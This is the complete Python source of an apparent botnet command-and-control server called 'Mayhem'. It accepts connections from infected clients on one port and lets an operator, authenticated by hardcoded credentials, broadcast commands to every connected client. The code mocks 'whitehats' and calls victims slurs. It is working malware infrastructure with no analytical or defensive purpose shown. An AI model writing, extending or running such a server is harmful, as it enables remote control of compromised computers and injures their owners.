import socket
import os
import threading


os.system("clear")

host = "0.0.0.0"
swami_port = 587
client_port = 6478

limit = 5
clients_6478 = []

banner = r"""
___       ___      _  ____     ___ ____    _____________ ___       ___
`MMb     dMM'     dM. `MM(     )M' `MM'    `MM`MMMMMMMMM `MMb     dMM'
 MMM.   ,PMM     ,MMb  `MM.    d'   MM      MM MM      \  MMM.   ,PMM
 M`Mb   d'MM     d'YM.  `MM.  d'    MM      MM MM         M`Mb   d'MM
 M YM. ,P MM    ,P `Mb   `MM d'     MM      MM MM    ,    M YM. ,P MM
 M `Mb d' MM    d'  YM.   `MM'      MMMMMMMMMM MMMMMMM    M `Mb d' MM
 M  YM.P  MM   ,P   `Mb    MM       MM      MM MM    `    M  YM.P  MM
 M  `Mb'  MM   d'    YM.   MM       MM      MM MM         M  `Mb'  MM
 M   YP   MM  ,MMMMMMMMb   MM       MM      MM MM         M   YP   MM
 M   `'   MM  d'      YM.  MM       MM      MM MM      /  M   `'   MM
_M_      _MM_dM_     _dMM__MM_     _MM_    _MM_MMMMMMMMM _M_      _MM_
V1.0
"""

def handle_retard_clients():
    client_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_server.bind((host, client_port))
    client_server.listen(limit)
    print(f"\033[94mListening for retards..\033[0m")
    while True:
        client, addr = client_server.accept()
        print(f"[6478] retard connected from {addr}")
        clients_6478.append(client)



def rgb_print(text, r, g, b):
    print(f"\033[38;2;{r};{g};{b}m{text}\033[0m")

def giveaccess(client_socket,clients_6478):
    print("access granted..")
    client_socket.sendall(b"Access granted\n")
    client_socket.sendall(b"Welcome to mayhem, Current clients:")
    client_list = [str(c.getpeername()) for c in clients_6478]
    client_socket.sendall(f"Current clients: {client_list}\n".encode('utf-8'))
    data = client_socket.recv(1024)

    while True:
        data = client_socket.recv(1024)
        if not data:
            print("Client disconnected")
            break

        command = data.decode('utf-8').strip()
        if command.lower() == "exit":
            client_socket.sendall(b"Goodbye!\n")
            break

        print(f"Received: {command}")

        for client in clients_6478:
            try:
                client.sendall(f"{command}\n".encode('utf-8'))
            except:
                pass

def recv_line(sock):
    data = sock.recv(1024).decode()
    return data.strip().splitlines()[0]

threading.Thread(target=handle_retard_clients, daemon=True).start()

credentials = {"Astra": "astra"}

rgb_print(banner, 0, 200, 255)
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((host, swami_port))
server_socket.listen(limit)

print(f"\033[94mListening on {swami_port}..\033[0m")

while True:
    client_socket, client_address = server_socket.accept()
    print(f"Connection from {client_address}")

    client_socket.sendall(banner.encode('utf-8'))
    client_socket.sendall(b"Welcome to Mayhem\n, please \n input password and username\nThis server accepts only authenticated connections.\nplease input your username first and then your password \n ")


    client_socket.sendall(b"Username: ")
    username = recv_line(client_socket)

    client_socket.sendall(b"Password: ")
    password = recv_line(client_socket)


    if username in credentials and credentials[username] == password:
        giveaccess(client_socket,clients_6478)

    else:
        client_socket.sendall(b"fuck you whitehat")
        client_socket.close()
